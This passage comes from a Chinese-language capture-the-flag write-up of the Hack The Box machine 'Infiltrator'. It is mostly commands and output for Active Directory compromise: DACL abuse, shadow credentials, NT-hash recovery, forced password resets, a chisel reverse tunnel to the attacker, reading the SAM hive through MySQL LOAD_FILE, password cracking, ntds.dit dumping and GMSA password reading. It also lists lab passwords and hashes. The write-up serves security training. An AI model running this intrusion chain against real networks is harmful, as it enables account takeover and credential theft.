<li>impacket/examples/dacledit.py at master · fortra/impacket<br><a href="https://github.com/fortra/impacket/blob/master/examples/dacledit.py" target="_blank" rel="noopener">https://github.com/fortra/impacket/blob/master/examples/dacledit.py</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" python3 examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/d.anderson -k -no-pass -dc-ip 10.10.11.31</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090204.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="Shadow-Credentials"><a href="#Shadow-Credentials" class="headerlink" title="Shadow Credentials"></a>Shadow Credentials</h2><p>现在d.anderson对MARKETING DIGITAL组有FullControl，E.RODRIGUEZ是该组成员，那就可以添加Shadow Credentials：</p>
<ul>
<li>CravateRouge/bloodyAD: BloodyAD is an Active Directory Privilege Escalation Framework<br><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">https://github.com/CravateRouge/bloodyAD</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" bloodyAD --host dc01.infiltrator.htb --dc-ip 10.10.11.31 -d infiltrator.htb -u d.anderson -k add shadowCredentials E.RODRIGUEZ</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090205.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>之后就是pkinit获取E.RODRIGUEZ hash：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" python3 ~/Tools/PKINITtools/gettgtpkinit.py -cert-pem oLXL7y8B_cert.pem -key-pem oLXL7y8B_priv.pem infiltrator.htb/E.RODRIGUEZ oLXL7y8B.ccache</span><br><span class="line"></span><br><span class="line">1a1b0b4c15fb8279b7178f87871ce20d3a4249830e2da0255584837b247e80ba</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./oLXL7y8B.ccache</span><br><span class="line"></span><br><span class="line">faketime -f "-8h10m" python3 ~/Tools/PKINITtools/getnthash.py infiltrator.htb/E.RODRIGUEZ -key 1a1b0b4c15fb8279b7178f87871ce20d3a4249830e2da0255584837b247e80ba</span><br><span class="line"></span><br><span class="line">Recovered NT Hash</span><br><span class="line">b02e97f2fdb5c3d36f77375383449e56</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090206.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="E-RODRIGUEZ"><a href="#E-RODRIGUEZ" class="headerlink" title="E.RODRIGUEZ"></a>E.RODRIGUEZ</h1><p>E.RODRIGUEZ对CHIEFS MARKETING组有AddSelf权限，CHIEFS MARKETING组对M.HARRIS有ForceChangePassword权限，还是一步步来</p>
<p>首先E.RODRIGUEZ把自己添加到CHIEFS MARKETING组：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" python3 examples/getTGT.py infiltrator.htb/E.RODRIGUEZ -hashes :b02e97f2fdb5c3d36f77375383449e56 -dc-ip 10.10.11.31</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./E.RODRIGUEZ.ccache</span><br><span class="line"></span><br><span class="line">faketime -f "-8h10m" bloodyAD --host dc01.infiltrator.htb --dc-ip 10.10.11.31 -u e.rodriguez -k -d infiltrator.htb add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090207.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后去修改M.HARRIS的密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./E.RODRIGUEZ.ccache</span><br><span class="line">faketime -f "-8h10m" bloodyAD --host dc01.infiltrator.htb --dc-ip 10.10.11.31 -u e.rodriguez -k -d infiltrator.htb set password m.harris 'NewPassword123!@'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 报错Password can<span class="string">'t be changed before -2 days, 23:56:09.695741 because of the minimum password age policy.，的话，快速连续完成一系列操作</span></span></span><br><span class="line">export KRB5CCNAME=./d.anderson.ccache</span><br><span class="line">faketime -f "-8h10m" python3 examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/d.anderson -k -no-pass -dc-ip 10.10.11.31</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改E.rodriguez密码</span></span><br><span class="line">faketime -f "-8h10m" bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "D.anderson" -p 'WAT?watismypass!' set password "E.rodriguez" 'WAT?watismypass!'</span><br><span class="line"></span><br><span class="line">faketime -f "-8h10m" bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "E.rodriguez" -p 'WAT?watismypass!' add groupMember "CHIEFS MARKETING" E.rodriguez</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改M.HARRIS密码</span></span><br><span class="line">faketime -f "-8h10m" bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "E.rodriguez" -p 'WAT?watismypass!' set password M.HARRIS 'WAT?watismypass!'</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090208.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>然后就是同样的请求TGT，evil-winrm连接:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">faketime -f "-8h10m" python3 examples/getTGT.py infiltrator.htb/m.harris:'WAT?watismypass!' -dc-ip 10.10.11.31</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这部分换kali虚拟机做了,mac里faketime跑evil-winrm还是提示时钟偏移问题</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo ntpdate -s 10.10.11.31</span></span><br><span class="line">export KRB5CCNAME=./m.harris.ccache</span><br><span class="line">evil-winrm -i DC01.INFILTRATOR.HTB -u M.HARRIS -r INFILTRATOR.HTB</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090209.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="etc-krb5-conf"><a href="#etc-krb5-conf" class="headerlink" title="/etc/krb5.conf"></a>/etc/krb5.conf</h2><p>Evil-winrm使用kerberos认证需要改下配置文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = INFILTRATOR.HTB</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    INFILTRATOR.HTB = &#123;</span><br><span class="line">        kdc = dc01.infiltrator.htb</span><br><span class="line">        admin_server = dc01.infiltrator.htb</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    .infiltrator.htb = INFILTRATOR.HTB</span><br><span class="line">    infiltrator.htb = INFILTRATOR.HTB</span><br></pre></td></tr></table></figure>

<h1 id="OutputMessengerMysql"><a href="#OutputMessengerMysql" class="headerlink" title="OutputMessengerMysql"></a>OutputMessengerMysql</h1><p>翻文件可以看到OutputMessenger相关文件，下载到本地查看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\ProgramData\Output Messenger Server\Temp&gt; download OutputMessengerMysql.zip</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090210.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ini中可以获取到mysql端口和密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQLPort&#x3D;14406</span><br><span class="line">Version&#x3D;1.0.0</span><br><span class="line"></span><br><span class="line">[DBCONFIG]</span><br><span class="line">DBUsername&#x3D;root</span><br><span class="line">DBPassword&#x3D;ibWijteig5</span><br><span class="line">DBName&#x3D;outputwall</span><br></pre></td></tr></table></figure>

<h1 id="非预期root"><a href="#非预期root" class="headerlink" title="非预期root"></a>非预期root</h1><p>转发mysql端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse</span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">.\chisel.exe client 10.10.14.13:9999 R:14406:127.0.0.1:14406</span><br></pre></td></tr></table></figure>

<p> 然后连接,可以直接使用LOAD_FILE读文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mycli -h 127.0.0.1 -P 14406 -uroot -pibWijteig5</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE('C:\\Users\\Administrator\\Desktop\\root.txt');</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE('C:\\Windows\\System32\\config\\SAM');</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090211.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="OutputMessenger"><a href="#OutputMessenger" class="headerlink" title="OutputMessenger"></a>OutputMessenger</h1><p>转发OutputMessenger相关服务端口，然后自己安装客户端使用前面LDAP中看到的K.turner身份连接：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe client 10.10.14.13:9999 R:14121:127.0.0.1:14121 R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 R:14124:127.0.0.1:14124 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126</span><br><span class="line"></span><br><span class="line">K.turner </span><br><span class="line">MessengerApp@Pass!</span><br></pre></td></tr></table></figure>

<p>登录后在dev chat的聊天记录和output wall中可以找到UserExplorer.exe相关信息:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090213.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090212.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris</span><br></pre></td></tr></table></figure>

<p>然后继续使用得到的m.harris密码登录OutputMessenger,在和Admin的聊天记录中可以得到这个文件:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090214.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="UserExplorer-exe"><a href="#UserExplorer-exe" class="headerlink" title="UserExplorer.exe"></a>UserExplorer.exe</h1><p>下载下来分析，得到winrm_svc的一些信息,解密得到winrm_svc:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090215.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 winrm_svc.py</span></span><br><span class="line"><span class="meta">WinRm@$</span><span class="bash">svc^!^P</span></span><br></pre></td></tr></table></figure>

<h2 id="winrm-svc-py"><a href="#winrm-svc-py" class="headerlink" title="winrm_svc.py"></a>winrm_svc.py</h2><p>基础的AES解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_string</span><span class="params">(key: str, cipher_text: str)</span> -&gt; str:</span></span><br><span class="line">  key_bytes = key.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">  cipher_bytes = base64.b64decode(cipher_text)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> len(key_bytes) <span class="keyword">not</span> <span class="keyword">in</span> &#123;<span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>&#125;:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"Key must be 16, 24, or 32 bytes long"</span>)</span><br><span class="line"></span><br><span class="line">  cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(<span class="string">b'\x00'</span> * <span class="number">16</span>), backend=default_backend())</span><br><span class="line">  decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">  decrypted_bytes = decryptor.update(cipher_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> decrypted_bytes.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'b14ca5898a4e4133bbce2ea2315a1916'</span></span><br><span class="line">cipher_text = <span class="string">'TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE='</span></span><br><span class="line"></span><br><span class="line">print(decrypt_string(key,decrypt_string(key, cipher_text)))</span><br></pre></td></tr></table></figure>

<h1 id="OutputMessenger-API"><a href="#OutputMessenger-API" class="headerlink" title="OutputMessenger API"></a>OutputMessenger API</h1><p>继续以winrm_svc 身份登录 Messenger 应用程序，查看note获取到API key:</p>
<p>(winrm_svc也可以直接winrm登录，更方便操作)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lan_managment  api key 558R501T5I6024Y8JV3B7KOUN1A518GG</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090216.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后在和O.martinez的聊天记录中可以得知O.martinez给Chiefs_Marketing_chat组共享了密码:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090217.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后使用API获取chatrooms,可以看到有一个Chiefs_Marketing_chat room：</p>
<ul>
<li>API for Chat Rooms | Output Messenger Server Manager<br><a href="https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms" target="_blank" rel="noopener">https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, */*' -H 'Host: infiltrator.htb:14125' 'http://127.0.0.1:14125/api/chatrooms/'</span><br><span class="line"></span><br><span class="line">&#123;"room":"Chiefs_Marketing_chat","roomusers":"O.martinez|0,A.walker|0"&#125;</span><br></pre></td></tr></table></figure>

<p>另一个需要的chatroom key需要在相关数据库文件中获取：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\appdata\Roaming\Output Messenger\JAAA&gt; download OM.db3</span><br><span class="line"></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from om_chatroom;</span></span><br><span class="line"></span><br><span class="line">2|Chiefs_Marketing_chat|20240220014618@conference.com|Chiefs_Marketing_chat||20240220014618@conference.com|1|2024-02-20 10:46:18.858|0|0||0|0|1||</span><br></pre></td></tr></table></figure>

<p>然后调用API查看log,在其中获取到O.martinez的密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, */*' -H 'Host: infiltrator.htb:14125' 'http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2024/02/01&amp;todate=2024/09/01' | jq '.logs'</span><br><span class="line"></span><br><span class="line">O.martinez : m@rtinez@1996!</span><br></pre></td></tr></table></figure>

<h1 id="O-martinez"><a href="#O-martinez" class="headerlink" title="O.martinez"></a>O.martinez</h1><p>根据之前的聊天记录说每天定时运行某些东西，使用O.martinez账号登录OutputMessenger，发现日历中相关信息：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090218.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>另外简单测试也可以发现日历中的event支持运行程序，那就是创建一个恶意程序传到机器上等待O.martinez的定时执行(时间根据和服务器的时差计算设置)：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090219.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>文件需要在本地和服务器上都存在，然后本地设置好任务后退出登录，等待服务器上触发event：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090221.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="network-capture-2024-pcapng"><a href="#network-capture-2024-pcapng" class="headerlink" title="network_capture_2024.pcapng"></a>network_capture_2024.pcapng</h2><p>然后在O.martinez的OutputMessenger相关目录中得到一个pcap文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\users\O.martinez\appdata\Roaming\Output Messenger\FAAA\Received Files\203301\network_capture_2024.pcapng</span><br></pre></td></tr></table></figure>

<p>文件中可以得到O.martinez的另一个密码，以及一个7z文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M@rtinez_P@ssw0rd!</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090220.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>得到的密码可以rdp登录O.martinez</p>
<h2 id="BitLocker-backup-7z"><a href="#BitLocker-backup-7z" class="headerlink" title="BitLocker-backup.7z"></a>BitLocker-backup.7z</h2><p>7z文件有密码，常规的破解密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7z2john BitLocker-backup.7z &gt; hash.txt</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">zipper           (BitLocker-backup.7z)</span><br></pre></td></tr></table></figure>

<h1 id="BitLocker"><a href="#BitLocker" class="headerlink" title="BitLocker"></a>BitLocker</h1><p>解压7z得到一个html文件，其中可以得到BitLocker的恢复密钥，O.martinez RDP登录也可以看到一个BitLocker加密的盘：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090222.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>使用恢复密钥解密，找到另一个7z文件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090223.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090224.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Backup-Credentials-7z"><a href="#Backup-Credentials-7z" class="headerlink" title="Backup_Credentials.7z"></a>Backup_Credentials.7z</h1><p>里面就是备份的凭据信息：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090225.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>常规的离线提取：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/secretsdump.py -ntds Backup_Credentials/Active\ Directory/ntds.dit -system Backup_Credentials/registry/SYSTEM LOCAL</span><br></pre></td></tr></table></figure>

<p>但都已经失效了，需要用另一种方式：</p>
<ul>
<li>almandin/ntdsdotsqlite: A small utility to translate NTDS.dit files to SQLite format.<br><a href="https://github.com/almandin/ntdsdotsqlite" target="_blank" rel="noopener">https://github.com/almandin/ntdsdotsqlite</a></li>
</ul>
<p>description中得到了lan_managment的密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsdotsqlite Active\ Directory/ntds.dit --system registry/SYSTEM -o NTDS.sqlite</span><br><span class="line"></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from user_accounts;</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select description,samaccountname from user_accounts;</span></span><br><span class="line"></span><br><span class="line">l@n_M@an!1331</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090226.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="lan-managment"><a href="#lan-managment" class="headerlink" title="lan_managment"></a>lan_managment</h1><p>lan_managment可以读GMSA：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090227.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gmsa"><a href="#gmsa" class="headerlink" title="gmsa"></a>gmsa</h2><p>读GMSA得到infiltrator_svc$</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.11.31 -u lan_managment -p 'l@n_M@an!1331' --gmsa</span><br><span class="line"></span><br><span class="line">LDAPS       10.10.11.31     636    DC01             Account: infiltrator_svc$     NTLM: 52dfec373c144cb8d50334cb73934612</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090228.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><p>常规ADCS枚举，发现ESC4:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u 'infiltrator_svc$' -hashes 52dfec373c144cb8d50334cb73934612 -dc-ip 10.10.11.31 -vulnerable -stdout</span><br><span class="line"></span><br><span class="line">infiltrator-DC01-CA</span><br><span class="line">Infiltrator_Template</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024090229.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ESC4"><a href="#ESC4" class="headerlink" title="ESC4"></a>ESC4</h2><p>参考文档，利用ESC4:</p>
<ul>
<li>ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse<br><a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4" target="_blank" rel="noopener">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4</a></li>
</ul>
